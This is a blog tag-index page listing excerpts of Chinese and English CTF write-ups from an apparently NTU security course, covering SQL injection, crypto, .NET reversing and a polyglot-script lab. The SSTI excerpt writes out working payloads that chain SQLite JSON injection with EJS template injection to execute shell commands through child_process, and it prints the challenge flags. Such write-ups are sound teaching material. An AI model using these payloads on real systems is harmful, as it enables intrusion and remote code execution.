<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/tags/eductf/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Eductf"><meta property="og:locale" content="en_us"><meta property="og:type" content="website"><title>Eductf | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/tags/eductf/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script><link rel=alternate type=application/rss+xml href=https://bernie6401.github.io/tags/eductf/index.xml title="SBK Hugo Site"></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Eductf</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav><ul><li class=book-section-flat><strong>Categories</strong><ul></ul></li><li class=book-section-flat><strong>Tags</strong><ul><li class="flex justify-between"><a href=/tags/ad/>AD</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/adworld/>Adworld</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/aegis/>AEGIS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ai/>AI</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ais3/>AIS3</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/android/>Android</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/balsnctf/>BalsnCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/book/>Book</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/btlo/>BTLO</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/cggc/>CGGC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/chatgpt/>ChatGPT</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/crewctf/>CrewCTF</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/crypto/>Crypto</a>
<span>36</span></li><li class="flex justify-between"><a href=/tags/cryptography/>Cryptography</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/csc/>CSC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ctf/>CTF</a>
<span>267</span></li><li class="flex justify-between"><a href=/tags/cyberdefender/>CyberDefender</a>
<span>23</span></li><li class="flex justify-between"><a href=/tags/data-structure/>Data Structure</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/deadfacectf/>DeadFaceCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/digital-forensics/>Digital Forensics</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/drozer/>Drozer</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/easy/>Easy</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/eductf/>Eductf</a>
<span>85</span></li><li class="flex justify-between"><a href=/tags/endpoint-forensics/>Endpoint Forensics</a>
<span>16</span></li><li class="flex justify-between"><a href=/tags/english-writing/>English Writing</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/forensics/>Forensics</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/general-skill/>General Skill</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/hackthebox/>Hackthebox</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/incident-response/>Incident Response</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/information-security/>Information Security</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/interview/>Interview</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/latex/>LaTeX</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/leetcode/>LeetCode</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/machine-learning/>Machine Learning</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/malware-reverse-engineering-and-analysis/>Malware Reverse Engineering and Analysis</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/meeting-paper/>Meeting Paper</a>
<span>20</span></li><li class="flex justify-between"><a href=/tags/misc/>Misc</a>
<span>44</span></li><li class="flex justify-between"><a href=/tags/mobsf/>MobSF</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/network-forensics/>Network Forensics</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/nisra/>NISRA</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu/>NTU</a>
<span>67</span></li><li class="flex justify-between"><a href=/tags/ntu_ct/>NTU_CT</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/ntu_ml/>NTU_ML</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/ntu_mr/>NTU_MR</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/ntu_os/>NTU_OS</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/ntu_padns/>NTU_PADNS</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu_st/>NTU_ST</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/ntucns/>NTUCNS</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/ntust/>NTUST</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ntustisc/>NTUSTISC</a>
<span>32</span></li><li class="flex justify-between"><a href=/tags/ntustws/>NTUSTWS</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/nycu/>NYCU</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/picoctf/>PicoCTF</a>
<span>112</span></li><li class="flex justify-between"><a href=/tags/portswigger-web-security-academy/>Portswigger Web Security Academy</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/problem-solution/>Problem Solution</a>
<span>28</span></li><li class="flex justify-between"><a href=/tags/pwn/>PWN</a>
<span>57</span></li><li class="flex justify-between"><a href=/tags/reverse/>Reverse</a>
<span>46</span></li><li class="flex justify-between"><a href=/tags/security-operation/>Security Operation</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/side-project/>Side Project</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/software-testing/>Software Testing</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/special-topic/>Special Topic</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/taiwanholyhigh/>TaiwanHolyHigh</a>
<span>9</span></li><li class="flex justify-between"><a href=/tags/tcivs/>TCIVS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/threat-intel/>Threat Intel</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/tools/>Tools</a>
<span>19</span></li><li class="flex justify-between"><a href=/tags/tscctf/>TSCCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/web/>Web</a>
<span>93</span></li><li class="flex justify-between"><a href=/tags/welcome/>Welcome</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/windows/>Windows</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B/>名詞解釋</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/%E8%AE%80%E6%9B%B8%E5%BF%83%E5%BE%97/>讀書心得</a>
<span>2</span></li></ul></li></ul></nav></aside></header><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/web/simple-web---0x412023-hw---double-injection---flag1/>Simple Web 0x41(2023 HW - Double Injection - FLAG1)</a></h2><div class=text-small><a href=/tags/eductf/>Eductf</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/web/>Web</a></div><p><h1 id=simple-web-0x412023-hw---double-injection---flag1>Simple Web 0x41(2023 HW - Double Injection - FLAG1)
<a class=anchor href=#simple-web-0x412023-hw---double-injection---flag1>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p>Time Based SQLi
:::info
建議先在local side自架docker environment，debug比較方便；另外也推薦在local自架sqlite的環境，下語法或是debug也很方便
:::</p><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler init-db.js</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>fs</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;fs&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>sqlite3</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;sqlite3&#39;</span>).<span style=color:#a6e22e>verbose</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>FLAG1</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>fs</span>.<span style=color:#a6e22e>readFileSync</span>(<span style=color:#e6db74>&#39;/flag1.txt&#39;</span>, <span style=color:#e6db74>&#39;utf8&#39;</span>).<span style=color:#a6e22e>trim</span>();
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>db</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>sqlite3</span>.<span style=color:#a6e22e>Database</span>(<span style=color:#e6db74>&#39;/etc/db.sqlite3&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>db</span>.<span style=color:#a6e22e>exec</span>(<span style=color:#e6db74>`
</span></span></span><span style=display:flex><span><span style=color:#e6db74>DROP TABLE IF EXISTS users;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>CREATE TABLE db (
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    users JSON NOT NULL
</span></span></span><span style=display:flex><span><span style=color:#e6db74>);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>INSERT INTO db(users) VALUES (&#39;{
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;admin&#34;: {
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &#34;username&#34;: &#34;admin&#34;,
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &#34;password&#34;: &#34;</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>FLAG1</span><span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    },
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;guest&#34;: {
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &#34;username&#34;: &#34;guest&#34;,
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &#34;password&#34;: &#34;guest&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    }
</span></span></span><span style=display:flex><span><span style=color:#e6db74>}&#39;);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>`</span>);
</span></span></code></pre></div><p>:::
:::spoiler Dockerfile</p><a href=/security/course/ntu-cs/web/simple-web---0x412023-hw---double-injection---flag1/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/web/simple-web---0x422023-hw---double-injection---flag2/>Simple Web 0x42(2023 HW - Double Injection - FLAG2)</a></h2><div class=text-small><a href=/tags/eductf/>Eductf</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/web/>Web</a></div><p><h1 id=simple-web-0x422023-hw---double-injection---flag2>Simple Web 0x42(2023 HW - Double Injection - FLAG2)
<a class=anchor href=#simple-web-0x422023-hw---double-injection---flag2>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p>Node JS ejs SSTI</p><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>呈上題</p><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><p>這一題想了很久，因為我沒有跟影片，想說應該都是跟去年差不多或是在臺科的網頁安全一樣，但其實相關的payload就是在講義上，花了一整天寫的我be like:
<img src=https://memeprod.ap-south-1.linodeobjects.com/user-template/7266c8627075418a7979b79481bf0f84.png alt>
基本上就是連接前一題的思緒，既然我們知道admin的password也就是FLAG1，那麼我們就可以用前一題的payload:</p><pre tabindex=0><code class=language-! data-lang=!>admin.password&#34;) as password, json_extract(users, &#39;$.admin.password&#39;) as password from db; -- #
</code></pre><p>後面搭配簡單的XSS也是可以通的，原本想說可以利用XSS達到RCE，但就我之前和Kaibro的詢問，XSS應該沒有這麼powerful，所以我就往SSTI或command injection下手，後來經過@cs-otaku的提點才知道ejs有一個洞，也是上課有提到的SSTI控到RCE，當時看的文章是Huli大寫的，內容詳細說明了為甚麼會有這個洞以及該如何構造攻擊的payload，不過整體更複雜也算是需要客製化的題目才需要了解這麼多，這一題算是只要取得經典的payload就可以攻克，如果想要用動態看他跑得怎麼樣，可以用web storm跟，想知道整體的動態流程可以看<a href=https://hackmd.io/@SBK6401/HkgkDNsPp>之前寫的文章</a></p><h2 id=exploit---ejs-ssti-rce>Exploit - Ejs SSTI RCE
<a class=anchor href=#exploit---ejs-ssti-rce>#</a></h2><ul><li>Payload 1:<ul><li>Username:<pre tabindex=0><code class=language-! data-lang=!>admin.password&#34;) as password, json_extract(users, &#39;$.admin.password&#39;) as password from db; -- # &lt;%= global.process.mainModule.require(&#34;child_process&#34;).execSync(&#34;ls -al /&#34;).toString() %&gt;
</code></pre></li><li>Password: <code>FLAG{sqlite_js0n_inject!on}</code></li><li>Result:<pre tabindex=0><code>total	76	
drwxr-xr-x	1	root	root	4096	Dec	18	18:54	.	
drwxr-xr-x	1	root	root	4096	Dec	18	18:54	..	
-rwxr-xr-x	1	root	root	0		Dec	18	18:54	.dockerenv	
drwxr-xr-x	1	root	root	4096	Dec	11	18:36	bin	
drwxr-xr-x	5	root	root	340		Dec	18	18:54	dev	
drwxr-xr-x	1	root	root	4096	Dec	18	18:54	etc	
-rw-r--r--	1	root	root	28		Dec	18	17:15	flag1.txt	
-rw-r--r--	1	root	root	23		Dec	18	17:15	flag2-1PRmDsTXoo3uPCdq.txt	
drwxr-xr-x	1	root	root	4096	Dec	18	17:15	home	
drwxr-xr-x	1	root	root	4096	Dec	11	18:36	lib	
drwxr-xr-x	5	root	root	4096	Dec	7	09:43	media	
drwxr-xr-x	2	root	root	4096	Dec	7	09:43	mnt	
drwxr-xr-x	1	root	root	4096	Dec	11	18:36	opt	
dr-xr-xr-x	497	root	root	0		Dec	18	18:54	proc	
drwx------	1	root	root	4096	Dec	11	18:36	root	
drwxr-xr-x	2	root	root	4096	Dec	7	09:43	run	
drwxr-xr-x	2	root	root	4096	Dec	7	09:43	sbin	
drwxr-xr-x	2	root	root	4096	Dec	7	09:43	srv	
dr-xr-xr-x	13	root	root	0		Dec	18	18:54	sys	
drwxrwxrwt	1	root	root	4096	Dec	22	17:16	tmp	
drwxr-xr-x	1	root	root	4096	Dec	18	13:27	usr	
drwxr-xr-x	12	root	root	4096	Dec	7	09:43	var	
</code></pre></li></ul></li><li>Payload 2:<ul><li>Username:<pre tabindex=0><code class=language-! data-lang=!>admin.password&#34;) as password, json_extract(users, &#39;$.admin.password&#39;) as password from db; -- # &lt;%= global.process.mainModule.require(&#34;child_process&#34;).execSync(&#34;cat /flag2-1PRmDsTXoo3uPCdq.txt&#34;).toString() %&gt;
</code></pre></li><li>Password: <code>FLAG{sqlite_js0n_inject!on}</code></li><li>Result: <code>FLAG{ezzzzz_sqli2ssti}</code></li></ul></li></ul><p>Flag: <code>FLAG{ezzzzz_sqli2ssti}</code></p><a href=/security/course/ntu-cs/web/simple-web---0x422023-hw---double-injection---flag2/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/welcome/simple-welcome---0x04lab---script/>Simple Welcome - 0x04(Lab - Script)</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/web/>Web</a>,
<a href=/tags/eductf/>Eductf</a></div><p><h1 id=simple-welcome---0x04lab---script>Simple Welcome - 0x04(Lab - Script)
<a class=anchor href=#simple-welcome---0x04lab---script>#</a></h1><h6 id=tags-ctf-web-eductf>tags: <code>CTF</code> <code>Web</code> <code>eductf</code>
<a class=anchor href=#tags-ctf-web-eductf>#</a></h6><p>Challenge: <a href=https://pyscript.ctf.zoolab.org/>https://pyscript.ctf.zoolab.org/</a></p><h2 id=source-code>Source Code
<a class=anchor href=#source-code>#</a></h2><pre tabindex=0><code class="language-php=" data-lang="php=">&lt;?php
    if(!isset($_FILES[&#34;file&#34;]))
        highlight_file(__file__) &amp;&amp; die();
    $flag = file_get_contents(&#39;/flag&#39;);
    $node = @`node {$_FILES[&#34;file&#34;][&#34;tmp_name&#34;]} 2&gt;&amp;1`;
    $python = @`python3 {$_FILES[&#34;file&#34;][&#34;tmp_name&#34;]} 2&gt;&amp;1`;
    if($flag === $node &amp;&amp; $flag === $python)
        echo &#39;Here is your Flag: &#39;.$flag;
    else
        echo &#39;Fail :(&#39;;
?&gt;
</code></pre><h3 id=analysis>Analysis
<a class=anchor href=#analysis>#</a></h3><p>Must write a script that can be executed in python and node language simultaneously.</p><a href=/security/course/ntu-cs/welcome/simple-welcome---0x04lab---script/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/welcome/simple-welcome-0x01lab---lets-meet-at-class/>Simple Welcome 0x01(Lab - Let's meet at class)</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/crypto/>Crypto</a>,
<a href=/tags/eductf/>Eductf</a></div><p><h1 id=simple-welcome-0x01lab---lets-meet-at-class>Simple Welcome 0x01(Lab - Let&rsquo;s meet at class)
<a class=anchor href=#simple-welcome-0x01lab---lets-meet-at-class>#</a></h1><h2 id=description>Description
<a class=anchor href=#description>#</a></h2><p>Crypto part of homework 0. The key space is $10^{15}$. I used my supercomputer(i5 7th gen) to solve it in about 10 minutes. It&rsquo;s impossible for you guys to enumerate all the keys in 2 weeks, or maybe you can&mldr; (Use <code>pip3 install pycryptodome</code> to install Crypto)</p><h2 id=source-code>Source Code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler Source</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> bytes_to_long, getPrime
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> random
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> math
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> secret <span style=color:#f92672>import</span> FLAG
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>FLAG <span style=color:#f92672>+=</span> os<span style=color:#f92672>.</span>urandom(<span style=color:#ae81ff>128</span> <span style=color:#f92672>-</span> len(FLAG))
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> bytes_to_long(FLAG)
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> getPrime(<span style=color:#ae81ff>1024</span>)
</span></span><span style=display:flex><span>keys <span style=color:#f92672>=</span> [pow(random<span style=color:#f92672>.</span>randint(<span style=color:#ae81ff>1000</span> <span style=color:#f92672>*</span> i <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>1000</span> <span style=color:#f92672>*</span> (i<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>) ), <span style=color:#ae81ff>65537</span>, p) <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>5</span>)]
</span></span><span style=display:flex><span>enc <span style=color:#f92672>=</span> flag
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>5</span>):
</span></span><span style=display:flex><span>    enc <span style=color:#f92672>=</span> enc <span style=color:#f92672>*</span> keys[i] <span style=color:#f92672>%</span> p
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>hint <span style=color:#f92672>=</span> keys[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>^</span> keys[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>^</span> keys[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>^</span> keys[<span style=color:#ae81ff>3</span>] <span style=color:#f92672>^</span> keys[<span style=color:#ae81ff>4</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#39;p =&#39;</span>, p)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#39;enc =&#39;</span>, enc)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#39;hint =&#39;</span>, hint)
</span></span></code></pre></div><p>:::
:::spoiler</p><a href=/security/course/ntu-cs/welcome/simple-welcome-0x01lab---lets-meet-at-class/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/welcome/simple-welcome-0x02--0x05lab---nine--nine-revenge/>Simple Welcome 0x02 & 0x05(Lab - Nine & Nine-Revenge)</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/reverse/>Reverse</a>,
<a href=/tags/eductf/>Eductf</a></div><p><h1 id=simple-welcome-0x02--0x05lab---nine--nine-revenge>Simple Welcome 0x02 & 0x05(Lab - Nine & Nine-Revenge)
<a class=anchor href=#simple-welcome-0x02--0x05lab---nine--nine-revenge>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><a href=https://www.tutorialspoint.com/convert-frombase64string-string-method-in-chash#>Convert.FromBase64String(String) Method in C#</a>
<a href="https://learn.microsoft.com/zh-tw/dotnet/api/system.string.substring?view=net-7.0">String.Substring 方法</a></p><h2 id=source-code>Source Code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler C# From dnSpy</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#75715e>// Nine.Stage</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Token: 0x0600000D RID: 13 RVA: 0x00002694 File Offset: 0x00000894</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> Flag()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>this</span>.font = <span style=color:#66d9ef>new</span> Font(<span style=color:#66d9ef>this</span>.fontFamily, <span style=color:#ae81ff>35f</span>, FontStyle.Regular);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>byte</span>[] array = Convert.FromBase64String(<span style=color:#e6db74>&#34;LwcvGwpuiPzT7+LY9PPo6eLpuiY7vTY6ejz2OH1pui5uDu6+LY5unpui+6uj14qmpuipqfo=&#34;</span>.Replace(<span style=color:#e6db74>&#34;pui&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>).Substring(<span style=color:#ae81ff>1</span>));
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i = <span style=color:#ae81ff>0</span>; i &lt; array.Length; i++)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		array[i] ^= <span style=color:#ae81ff>135</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>this</span>.SetMessageBox(Encoding.UTF8.GetString(array));
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>:::</p><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><ol><li>起手式一定用DIE或其他檢測tool看一下是用哪種東西編譯或有沒有加殼
<img src=https://hackmd.io/_uploads/SksyjD8K3.png alt>
我一開始以為可以用IDA之類的東西反編譯他，但是顯然IDA沒辦法解析<code>.NET</code> file，這一題也是看了別人的WP<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>才知道有<a href=https://github.com/dnSpy/dnSpy/releases>dnSpy</a>這東西可以用
<img src=https://hackmd.io/_uploads/rkiIiwUK3.png alt></li><li>執行程式
實際執行起來會發現它就是個小遊戲，可以用方向鍵操控人移動或是移開石頭，重點是要拿到鑰匙並開鎖拿到旗子，玩了好久都沒成功，所以想說可以用dnSpy看一下可以用的東西
<img src=https://hackmd.io/_uploads/rkR8cPIt2.png alt></li><li>用dnSpy看source code
在<code>/Nine/Nine.exe/Nine/Stage@02000004/Flag()</code>以及<code>/Nine-revenge/Nine-revenge.exe/Nine/Stage@02000004/Flag()</code>都可以直接看到flag function怎麼寫的，所以其實這一題只要知道dnSpy這東西，其實就過於簡單
:::spoiler Function Path Screenshot
<img src=https://hackmd.io/_uploads/HkHxLuUYh.png alt>
<img src=https://hackmd.io/_uploads/SyW-8OUK3.png alt>
:::</li></ol><h2 id=exploit>Exploit
<a class=anchor href=#exploit>#</a></h2><p>也是可以直接用C#的線上editor，不過如果不會寫的話就可以直接看source code然後用熟悉的語言寫script</p><a href=/security/course/ntu-cs/welcome/simple-welcome-0x02--0x05lab---nine--nine-revenge/>...</a></p></article><ul class="pagination pagination-default"><li class=page-item><a href=/tags/eductf/ aria-label=First class=page-link role=button><span aria-hidden=true>&#171;&#171;</span></a></li><li class=page-item><a href=/tags/eductf/page/8/ aria-label=Previous class=page-link role=button><span aria-hidden=true>&#171;</span></a></li><li class=page-item><a href=/tags/eductf/page/5/ aria-label="Page 5" class=page-link role=button>5</a></li><li class=page-item><a href=/tags/eductf/page/6/ aria-label="Page 6" class=page-link role=button>6</a></li><li class=page-item><a href=/tags/eductf/page/7/ aria-label="Page 7" class=page-link role=button>7</a></li><li class=page-item><a href=/tags/eductf/page/8/ aria-label="Page 8" class=page-link role=button>8</a></li><li class="page-item active"><a aria-current=page aria-label="Page 9" class=page-link role=button>9</a></li><li class="page-item disabled"><a aria-disabled=true aria-label=Next class=page-link role=button tabindex=-1><span aria-hidden=true>&#187;</span></a></li><li class="page-item disabled"><a aria-disabled=true aria-label=Last class=page-link role=button tabindex=-1><span aria-hidden=true>&#187;&#187;</span></a></li></ul><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav><ul><li class=book-section-flat><strong>Categories</strong><ul></ul></li><li class=book-section-flat><strong>Tags</strong><ul><li class="flex justify-between"><a href=/tags/ad/>AD</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/adworld/>Adworld</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/aegis/>AEGIS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ai/>AI</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ais3/>AIS3</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/android/>Android</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/balsnctf/>BalsnCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/book/>Book</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/btlo/>BTLO</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/cggc/>CGGC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/chatgpt/>ChatGPT</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/crewctf/>CrewCTF</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/crypto/>Crypto</a>
<span>36</span></li><li class="flex justify-between"><a href=/tags/cryptography/>Cryptography</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/csc/>CSC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ctf/>CTF</a>
<span>267</span></li><li class="flex justify-between"><a href=/tags/cyberdefender/>CyberDefender</a>
<span>23</span></li><li class="flex justify-between"><a href=/tags/data-structure/>Data Structure</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/deadfacectf/>DeadFaceCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/digital-forensics/>Digital Forensics</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/drozer/>Drozer</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/easy/>Easy</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/eductf/>Eductf</a>
<span>85</span></li><li class="flex justify-between"><a href=/tags/endpoint-forensics/>Endpoint Forensics</a>
